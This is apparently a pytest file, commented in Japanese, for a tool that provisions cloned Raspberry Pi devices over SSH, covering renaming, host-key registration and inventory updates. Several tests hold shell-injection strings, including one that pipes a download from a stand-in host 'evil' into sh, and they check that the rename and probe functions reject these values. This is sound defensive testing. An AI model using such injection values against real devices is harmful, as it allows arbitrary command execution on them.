"""登録6工程の検証。

工程1(送信停止)を最初に置くのは、SDクローンだと MQTT の client_id が衝突して
2台が互いを蹴り合うため。この競合を止めるのが STA_NO の是正より先に来る。

対象は必ずIPで指定する。ホスト名で指定するとクローン2台のどちらを操作しているか
判別できない。
"""
from fleet_ui.provision import (
    add_to_inventory,
    adopt_keeping_identity,
    blank_sta_no,
    probe_hostname,
    register_host_key,
    register_new_child,
    rename_and_reboot,
    stop_publisher,
    wait_for_return,
)


def _recorder(fail_on=None, out=""):
    calls = []

    def run(cmd):
        calls.append(cmd)
        if fail_on and any(fail_on in c for c in cmd):
            raise RuntimeError("boom")
        return out
    run.calls = calls
    return run


def test_stop_publisher_targets_the_ip_not_a_hostname():
    r = _recorder()
    assert stop_publisher("10.42.0.194", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "pi@10.42.0.194" in joined
    assert "stop child-csv-to-mqtt" in joined


def test_blank_sta_no_backs_up_first():
    r = _recorder()
    assert blank_sta_no("10.42.0.194", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "clone-backup" in joined


def test_rename_updates_hostname_and_hosts_then_reboots():
    r = _recorder()
    assert rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "set-hostname pizero2w-3" in joined
    assert "/etc/hosts" in joined
    assert "reboot" in joined


def test_rename_does_not_substitute_by_the_old_hostname():
    """旧ホスト名で置換してはいけない。

    `\\b` はハイフンの手前でも単語境界になるため、旧名 pizero2w の置換が
    pizero2w-2 の行にも当たり pizero2w-3-2 のように別ホストの行を壊す。
    127.0.1.1 行を丸ごと差し替える形にすれば旧名に依存せず、set-hostname との
    順序も問題にならない。
    """
    r = _recorder()
    rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r)
    cmd = r.calls[0][-1]
    assert "$(hostname)" not in cmd
    assert "127.0.1.1" in cmd


def test_rename_appends_the_hosts_line_when_missing():
    """127.0.1.1 行が無い機体でも名前解決が壊れたままにならないこと。"""
    r = _recorder()
    rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r)
    cmd = r.calls[0][-1]
    assert "tee -a /etc/hosts" in cmd


def test_failed_step_returns_not_ok_instead_of_raising():
    r = _recorder(fail_on="child-csv-to-mqtt")
    res = stop_publisher("10.42.0.194", runner=r)
    assert res.ok is False
    assert res.message


def test_wait_for_return_finds_the_device_by_mac_after_reboot():
    """再起動でIPが変わり得るのでMACで引き直す。"""
    seen = {"n": 0}

    def runner(cmd):
        seen["n"] += 1
        if seen["n"] < 3:
            return ""          # まだ戻っていない
        return "10.42.0.77 lladdr 88:a2:9e:30:5e:46 REACHABLE\n"

    res = wait_for_return("88:a2:9e:30:5e:46", timeout_s=30,
                          runner=runner, sleeper=lambda s: None)
    assert res.ok
    assert "10.42.0.77" in res.message


def test_wait_for_return_times_out_cleanly():
    res = wait_for_return("88:a2:9e:30:5e:46", timeout_s=4,
                          runner=lambda cmd: "", sleeper=lambda s: None)
    assert res.ok is False


def test_wait_for_return_uses_ap_dev_env(monkeypatch):
    monkeypatch.setenv("AP_DEV", "wlan0")
    seen = []

    def runner(cmd):
        seen.append(cmd)
        return "10.42.0.77 lladdr 88:a2:9e:30:5e:46 REACHABLE\n"

    res = wait_for_return(
        "88:a2:9e:30:5e:46",
        timeout_s=30,
        runner=runner,
        sleeper=lambda s: None,
    )
    assert res.ok
    assert seen[0] == ["ip", "-4", "neigh", "show", "dev", "wlan0"]


def test_register_host_key_appends_to_known_hosts(tmp_path):
    """本物の ~/.ssh/known_hosts を汚さないよう、必ず known_hosts を渡すこと。"""
    kh = tmp_path / "known_hosts"
    kh.write_text("", encoding="utf-8")
    r = _recorder(out="pizero2w-3.local ssh-ed25519 AAAA\n")
    assert register_host_key("pizero2w-3.local", runner=r, known_hosts=kh).ok
    assert any(c[0] == "ssh-keyscan" for c in r.calls)
    assert "pizero2w-3.local" in kh.read_text(encoding="utf-8")


def test_register_host_key_writes_nothing_when_keyscan_is_empty(tmp_path):
    """鍵が取れなかったのに空行を足すと known_hosts が汚れるだけ。"""
    kh = tmp_path / "known_hosts"
    kh.write_text("既存の行\n", encoding="utf-8")
    register_host_key("nowhere.local", runner=_recorder(out=""), known_hosts=kh)
    assert kh.read_text(encoding="utf-8") == "既存の行\n"


def test_add_to_inventory_appends_the_entry(tmp_path):
    f = tmp_path / "children.conf"
    f.write_text("# 見出し\nzero2\n", encoding="utf-8")
    assert add_to_inventory("pizero2w-3.local", path=f).ok
    assert f.read_text(encoding="utf-8").splitlines()[-1] == "pizero2w-3.local"


def test_add_to_inventory_is_idempotent(tmp_path):
    """二重登録すると同じ子へ二重配布してしまう。"""
    f = tmp_path / "children.conf"
    f.write_text("zero2\npizero2w-3.local\n", encoding="utf-8")
    res = add_to_inventory("pizero2w-3.local", path=f)
    assert res.ok
    assert f.read_text(encoding="utf-8").count("pizero2w-3.local") == 1


def test_rename_refuses_shell_metacharacters():
    """new_hostname は sed / printf へ素で埋め込まれる。呼び出し側の検証に
    依存せず、この関数自身で弾くこと。

    `x/"; touch /tmp/PWNED; echo "` は sed の二重引用符から抜けて子の上で
    任意のコマンドを実行できてしまう。
    """
    r = _recorder()
    res = rename_and_reboot("10.42.0.194", 'x/"; touch /tmp/PWNED; echo "', runner=r)
    assert res.ok is False
    assert r.calls == []          # 一切実行しない


def test_rename_refuses_single_quote_injection():
    r = _recorder()
    assert rename_and_reboot("10.42.0.194", "a'; curl evil|sh; echo '", runner=r).ok is False
    assert r.calls == []


def test_rename_refuses_trailing_newline():
    """`$` は末尾改行の直前でもマッチするため、'pizero2w-3\\n' が通っていた。"""
    r = _recorder()
    assert rename_and_reboot("10.42.0.194", "pizero2w-3\n", runner=r).ok is False
    assert r.calls == []


def test_adopt_keeps_identity_and_skips_blank_rename(tmp_path):
    calls = []

    def run(cmd):
        calls.append(cmd)
        if cmd[-1] == "hostname":
            return "zero2\n"
        if "ssh-keyscan" in cmd:
            return "hostkey-line\n"
        return ""

    inv = tmp_path / "children.conf"
    inv.write_text("# empty\n", encoding="utf-8")
    known = tmp_path / "known_hosts"
    known.write_text("", encoding="utf-8")
    res = adopt_keeping_identity(
        "10.42.0.9",
        existing=[],
        runner=run,
        known_hosts=known,
        inventory_path=inv,
    )
    assert res.ok, res.message
    joined = "\n".join(" ".join(c) for c in calls)
    assert "hostnamectl" not in joined
    assert "id_names_config" not in joined
    assert "zero2.local" in inv.read_text(encoding="utf-8")
    assert "hostkey-line" in known.read_text(encoding="utf-8")


def test_adopt_without_ssh_key_explains_sd_path():
    res = adopt_keeping_identity("10.42.0.9", existing=[], runner=lambda cmd: "")
    assert not res.ok
    assert "子SD" in res.message or "SSH" in res.message


def test_probe_hostname_rejects_injection_without_running_ssh():
    calls = []
    host = probe_hostname("10.42.0.1; rm", runner=lambda cmd: calls.append(cmd) or "nope")
    assert host == ""
    assert calls == []


def test_register_new_child_blanks_sta_and_renames(tmp_path):
    from fleet_ui.provision import StepResult

    calls = []

    def run(cmd):
        calls.append(cmd)
        if "ssh-keyscan" in cmd:
            return "hostkey-line\n"
        return ""

    inv = tmp_path / "children.conf"
    inv.write_text("# empty\n", encoding="utf-8")
    known = tmp_path / "known_hosts"
    known.write_text("", encoding="utf-8")
    res = register_new_child(
        "10.42.0.194",
        "aa:bb:cc:dd:ee:ff",
        "pizero2w-3",
        existing=["zero2.local"],
        runner=run,
        wait_fn=lambda mac, **k: StepResult(ok=True, message="復帰", output="10.42.0.80"),
        known_hosts=known,
        inventory_path=inv,
    )
    assert res.ok, res.message
    joined = "\n".join(" ".join(c) for c in calls)
    assert "stop child-csv-to-mqtt" in joined
    assert "clone-backup" in joined
    assert "set-hostname pizero2w-3" in joined
    assert "avahi-daemon" in joined
    assert "pi@zero2.local" in joined
    assert "pi@10.42.0.80" in joined
    assert "pizero2w-3.local" in inv.read_text(encoding="utf-8")
    assert "局番号は空" in res.message


def test_register_new_child_rejects_duplicate_hostname(tmp_path):
    from fleet_ui.provision import StepResult
    res = register_new_child(
        "10.42.0.194",
        "aa:bb:cc:dd:ee:ff",
        "zero2",
        existing=["zero2.local"],
        runner=lambda cmd: "",
        wait_fn=lambda mac, **k: StepResult(ok=True, message=""),
        inventory_path=tmp_path / "children.conf",
    )
    assert not res.ok
    assert "既に使われています" in res.message
